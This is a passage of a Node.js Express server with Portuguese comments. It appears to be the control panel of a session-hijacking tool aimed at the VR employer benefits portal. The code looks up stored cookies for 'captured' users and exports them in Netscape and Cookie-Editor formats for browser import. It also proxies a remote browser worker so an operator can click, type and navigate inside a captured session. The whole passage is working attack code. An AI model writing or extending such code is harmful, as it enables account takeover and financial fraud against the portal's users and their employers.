        // 1. Busca o arquivo de sessão mais recente em SESSOES_DIR
        if (fs.existsSync(SESSOES_DIR)) {
            try {
                const files = fs.readdirSync(SESSOES_DIR)
                    .filter(f => f.endsWith("_cookies.json"))
                    .map(f => ({
                        file: f,
                        path: path.join(SESSOES_DIR, f),
                        mtime: fs.statSync(path.join(SESSOES_DIR, f)).mtimeMs
                    }))
                    .sort((a, b) => b.mtime - a.mtime);

                if (files.length > 0) {
                    const latest = files[0];
                    const sessionData = JSON.parse(fs.readFileSync(latest.path, "utf8"));
                    const userKey = latest.file.replace(/_cookies\.json$/, "");
                    return {
                        sessionData,
                        userKey,
                        sessionFile: latest.path
                    };
                }
            } catch (e) {
                console.error("[SESSAO] Erro ao buscar sessão mais recente em SESSOES_DIR:", e);
            }
        }

        // Fallback: busca último em resultado.json
        const resultados = lerResultados();
        for (let i = resultados.length - 1; i >= 0; i--) {
            const r = resultados[i];
            if (r && r.cookies && r.cookies.length > 0) {
                const userKey = (r.nome || "").toLowerCase().replace(/[^a-z0-9_-]/g, "_");
                return {
                    sessionData: {
                        tenant: r.tenant || "default",
                        usuario: r.nome,
                        data_hora: r.data_hora,
                        url_final: r.url_final || "https://superportal-empregador.vr.com.br/",
                        cookies: r.cookies
                    },
                    userKey,
                    sessionFile: ""
                };
            }
        }
        return null;
    }

    // 1. Chave canônica a partir do usuário sanitizado
    const userKey = usuario.replace(/[^a-z0-9_-]/g, "_");
    let sessionFile = path.join(SESSOES_DIR, `${userKey}_cookies.json`);
    let sessionData = null;

    if (fs.existsSync(sessionFile)) {
        try {
            sessionData = JSON.parse(fs.readFileSync(sessionFile, "utf8"));
        } catch (e) {
            console.error(`[SESSAO] Erro ao ler ${sessionFile}:`, e);
        }
    }

    // 2. Busca flexível em SESSOES_DIR se não encontrado diretamente
    if (!sessionData && fs.existsSync(SESSOES_DIR)) {
        try {
            const files = fs.readdirSync(SESSOES_DIR).filter(f => f.endsWith("_cookies.json"));
            const prefixoUsuario = usuario.split("@")[0].replace(/[^a-z0-9_-]/g, "_");
            const cleanKey = userKey.replace(/_+/g, "_").replace(/^_|_$/g, "");

            const candidate = files.find(f => {
                const base = f.replace(/_cookies\.json$/, "").toLowerCase();
                return base === userKey ||
                       base === cleanKey ||
                       base === prefixoUsuario ||
                       (prefixoUsuario.length >= 4 && base.startsWith(prefixoUsuario)) ||
                       base.includes(cleanKey) ||
                       cleanKey.includes(base);
            });

            if (candidate) {
                const candidatePath = path.join(SESSOES_DIR, candidate);
                sessionData = JSON.parse(fs.readFileSync(candidatePath, "utf8"));
                sessionFile = candidatePath;
            }
        } catch (e) {
            console.error("[SESSAO] Erro na busca flexível de cookies:", e);
        }
    }

    // 3. Fallback: busca em resultado.json
    if (!sessionData) {
        const resultados = lerResultados();
        for (let i = resultados.length - 1; i >= 0; i--) {
            const r = resultados[i];
            if (!r || !r.cookies) continue;
            const rNome = (r.nome || "").toLowerCase().trim();
            const rKey = rNome.replace(/[^a-z0-9_-]/g, "_");
            if (rNome === usuario || rKey === userKey || (usuario && rNome.includes(usuario)) || (rNome && usuario.includes(rNome))) {
                sessionData = {
                    tenant: r.tenant || "default",
                    usuario: r.nome,
                    data_hora: r.data_hora,
                    url_final: r.url_final || "https://superportal.vr.com.br/",
                    cookies: r.cookies
                };
                break;
            }
        }
    }

    if (!sessionData) return null;

    return {
        sessionData,
        userKey,
        sessionFile
    };
}

// 1. Rotas de Exportação (declaradas antes das rotas parametrizadas :usuario)
app.get(
    ["/api/sessao/exportar", "/api/sessaoremota/exportar", "/api/sessao/:usuario/exportar", "/api/sessaoremota/:usuario/exportar"],
    (req, res) => {
        const usuarioParam = (req.params.usuario && req.params.usuario !== "exportar") ? req.params.usuario : (req.query.usuario || "");
        const tenantParam = req.query.tenant || req.query.cliente || null;
        const formato = (req.query.formato || "json").toLowerCase();
        const resolved = resolverSessaoCookies(usuarioParam, tenantParam);
        if (!resolved || !resolved.sessionData || !resolved.sessionData.cookies) {
            return res.status(404).send("Sessão não encontrada");
        }

        const { sessionData, userKey } = resolved;
        const cookies = sessionData.cookies;

        if (formato === "netscape" || formato === "txt") {
            let txt = "# Netscape HTTP Cookie File\n";
            txt += "# https://curl.se/docs/http-cookies.html\n";
            txt += `# Capturado por VR Monitor em ${sessionData.data_hora || new Date().toISOString()} [Tenant: ${sessionData.tenant || 'default'}]\n\n`;

            cookies.forEach(c => {
                const domain = c.domain.startsWith(".") ? c.domain : `.${c.domain}`;
                const flag = domain.startsWith(".") ? "TRUE" : "FALSE";
                const path = c.path || "/";
                const secure = c.secure ? "TRUE" : "FALSE";
                const expiry = c.expires && c.expires > 0 ? Math.floor(c.expires) : Math.floor(Date.now() / 1000) + 86400 * 30;
                txt += `${domain}\t${flag}\t${path}\t${secure}\t${expiry}\t${c.name}\t${c.value}\n`;
            });

            res.setHeader("Content-Type", "text/plain; charset=utf-8");
            res.setHeader("Content-Disposition", `attachment; filename="cookies_${userKey}.txt"`);
            return res.send(txt);
        }

        // Formato Cookie-Editor
        const cookieEditorFormat = cookies.map(c => ({
            domain: c.domain,
            expirationDate: c.expires && c.expires > 0 ? c.expires : undefined,
            hostOnly: !c.domain.startsWith("."),
            httpOnly: !!c.httpOnly,
            name: c.name,
            path: c.path || "/",
            sameSite: c.sameSite ? c.sameSite.toLowerCase() : "unspecified",
            secure: !!c.secure,
            session: !c.expires || c.expires <= 0,
            storeId: "0",
            value: c.value
        }));

        res.setHeader("Content-Type", "application/json; charset=utf-8");
        res.setHeader("Content-Disposition", `attachment; filename="cookies_${userKey}.json"`);
        return res.send(JSON.stringify(cookieEditorFormat, null, 2));
    }
);

// 2. Rotas de Consulta JSON da Sessão
app.get(
    ["/api/sessao", "/api/sessaoremota", "/api/sessao/:usuario", "/api/sessaoremota/:usuario"],
    (req, res) => {
        const usuarioParam = (req.params.usuario && req.params.usuario !== "exportar") ? req.params.usuario : (req.query.usuario || "");
        const tenantParam = req.query.tenant || req.query.cliente || null;
        const resolved = resolverSessaoCookies(usuarioParam, tenantParam);
        if (!resolved || !resolved.sessionData) {
            return res.status(404).json({ success: false, mensagem: "Sessão de cookies não encontrada." });
        }

        const { sessionData, userKey } = resolved;
        const rawCookies = sessionData.cookies || [];
        const itemTenant = sessionData.tenant || "default";

        // Gera formato específico compatível com a extensão Cookie-Editor
        const cookieEditorFormat = rawCookies.map(c => ({
            domain: c.domain,
            expirationDate: c.expires && c.expires > 0 ? c.expires : undefined,
            hostOnly: !c.domain.startsWith("."),
            httpOnly: !!c.httpOnly,
            name: c.name,
            path: c.path || "/",
            sameSite: c.sameSite ? c.sameSite.toLowerCase() : "unspecified",
            secure: !!c.secure,
            session: !c.expires || c.expires <= 0,
            storeId: "0",
            value: c.value
        }));

        return res.json({
            success: true,
            tenant: itemTenant,
            usuario: sessionData.usuario,
            data_hora: sessionData.data_hora,
            url_final: sessionData.url_final || "https://superportal-empregador.vr.com.br/",
            total_cookies: rawCookies.length,
            cookies: rawCookies,
            cookie_editor_json: cookieEditorFormat,
            link_acesso: `/sessaoremota.html?usuario=${encodeURIComponent(sessionData.usuario)}&tenant=${encodeURIComponent(itemTenant)}`
        });
    }
);

// ==========================================
// PROXY DE CONTROLE DO NAVEGADOR REMOTO (VR)
// ==========================================
app.get("/api/remota/status", async (req, res) => {
    try {
        const resp = await fetch(`${WORKER_URL}/remota/status`);
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Worker remoto offline" });
    }
});

app.post("/api/remota/iniciar", async (req, res) => {
    try {
        const usuario = (req.body.usuario || "").trim();
        if (!usuario || usuario.toLowerCase() in { sessao: 1, sessaoremota: 1, acesso: 1 }) {
            return res.status(400).json({
                success: false,
                mensagem: "Nenhum usuário selecionado. Por favor, selecione um usuário capturado na lista."
            });
        }
        const resp = await fetch(`${WORKER_URL}/remota/iniciar`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ usuario })
        });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Falha ao iniciar navegador remoto no worker" });
    }
});

app.get("/api/remota/screenshot", async (req, res) => {
    try {
        const resp = await fetch(`${WORKER_URL}/remota/screenshot`);
        if (!resp.ok) {
            return res.status(resp.status).send("Screenshot indisponível");
        }
        res.setHeader("Content-Type", "image/jpeg");
        res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");
        const arrayBuf = await resp.arrayBuffer();
        res.end(Buffer.from(arrayBuf));
    } catch (e) {
        res.status(502).send("Erro ao obter screenshot");
    }
});

app.post("/api/remota/clique", async (req, res) => {
    try {
        const { x, y } = req.body;
        const resp = await fetch(`${WORKER_URL}/remota/clique`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ x: Math.round(Number(x)), y: Math.round(Number(y)) })
        });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Erro ao despachar clique" });
    }
});

app.post("/api/remota/navegar", async (req, res) => {
    try {
        const { url } = req.body;
        const resp = await fetch(`${WORKER_URL}/remota/navegar`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ url: String(url || "") })
        });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Erro ao navegar" });
    }
});

app.post("/api/remota/digitar", async (req, res) => {
    try {
        const { texto } = req.body;
        const resp = await fetch(`${WORKER_URL}/remota/digitar`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ texto: String(texto || "") })
        });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Erro ao digitar" });
    }
});

app.post("/api/remota/tecla", async (req, res) => {
    try {
        const { tecla } = req.body;
        const resp = await fetch(`${WORKER_URL}/remota/tecla`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ tecla: String(tecla || "") })
        });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Erro ao enviar tecla" });
    }
});

app.post("/api/remota/scroll", async (req, res) => {
    try {
        const { delta_y } = req.body;
        const resp = await fetch(`${WORKER_URL}/remota/scroll`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ delta_y: Number(delta_y || 0) })
        });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Erro ao rolar tela" });
    }
});

app.post("/api/remota/voltar", async (req, res) => {
    try {
        const resp = await fetch(`${WORKER_URL}/remota/voltar`, { method: "POST" });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Erro ao voltar" });
    }
});

app.post("/api/remota/avancar", async (req, res) => {
    try {
        const resp = await fetch(`${WORKER_URL}/remota/avancar`, { method: "POST" });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Erro ao avançar" });
    }
});

app.post("/api/remota/recarregar", async (req, res) => {
    try {
        const resp = await fetch(`${WORKER_URL}/remota/recarregar`, { method: "POST" });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Erro ao recarregar" });
    }
});

app.get(
    ["/sessaoremota/:usuario", "/sessaoremota"],
    (req, res) => {
        res.sendFile(
            path.join(
                PUBLIC_DIR,
                "sessaoremota.html"
            )
        );
    }
);

app.get(
    ["/sessao/:usuario", "/acesso/:usuario", "/sessao", "/acesso"],
    (req, res) => {
        res.sendFile(
            path.join(
                PUBLIC_DIR,
                "sessao.html"
            )
        );
    }
);

app.get(
    "/painel",
    (req, res) => {
        res.sendFile(
            path.join(
                PUBLIC_DIR,
                "painel.html"
            )
        );
    }
);

app.get(
    "/codigo",
    (req, res) => {
        res.sendFile(
            path.join(
                PUBLIC_DIR,
                "codigo.html"
            )
        );
    }
);

app.get(
    "/",
    (req, res) => {

        res.sendFile(
            path.join(
                PUBLIC_DIR,
                "index.html"
            )
        );
    }
);

app.get(
    "/health",
    (req, res) => {
        res.json({
            status: "ok",
            service: "vr-web",
            uptime: process.uptime(),
            timestamp: new Date().toISOString()
        });
    }
);

app.listen(
    PORT,
    () => {

        console.log();
        console.log(
            "===================================="
        );

        console.log(
            `Servidor rodando em http://localhost:${PORT}`
        );

        console.log(
            "===================================="
        );

        console.log();
    }
);